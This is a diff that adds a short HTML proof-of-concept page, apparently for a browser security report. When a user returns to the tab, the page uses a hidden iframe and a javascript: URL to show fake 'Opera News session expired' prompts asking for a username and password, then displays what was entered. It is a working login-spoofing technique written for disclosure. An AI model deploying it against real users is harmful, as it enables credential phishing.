@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no">
+<title>visibilitychange UI Trigger</title>
+
+<style>
+  iframe {
+    visibility: hidden;
+    width: 0;
+    height: 0;
+  }
+</style>
+
+<script>
+let armed = false;
+
+document.addEventListener("visibilitychange", function () {
+  // Tahap 1: halaman disembunyikan (tab pindah / minimize)
+  if (document.visibilityState === "hidden") {
+    armed = true;
+    return;
+  }
+
+  // Tahap 2: halaman terlihat lagi → trigger
+  if (document.visibilityState === "visible" && armed) {
+    armed = false; // reset supaya bisa dipakai lagi
+
+    const iframe = document.getElementById("iframe");
+    iframe.src =
+"javascript:(function(){\
+          var u = prompt('Opera News session expired.\\nPlease sign in again to continue.\\nUsername:');\
+          if(u === null) return;\
+          var p = prompt('Password:');\
+          if(p === null) return;\
+          alert('This is your credentials\\n\\nUsername: ' + u + '\\nPassword: ' + p);\
+        })();";
+  }
+});
+</script>
+</head>
+
+<body>
+<center>
+  <br>
+  <h1>VisibilityChange Trigger Test</h1>
+</center>
+
+<iframe id="iframe"></iframe>
+</body>
+</html>
